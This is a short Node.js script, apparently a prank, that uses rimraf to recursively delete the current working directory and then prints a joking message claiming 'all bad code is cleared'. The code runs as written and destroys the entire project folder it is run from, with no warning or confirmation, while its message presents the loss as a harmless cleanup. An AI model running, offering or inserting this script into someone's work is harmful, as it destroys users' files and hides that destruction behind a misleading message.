const rimraf = require('rimraf')

const projectDir = process.cwd()

rimraf(projectDir, () => {
  console.log('All bad code is cleared. 😎')
})
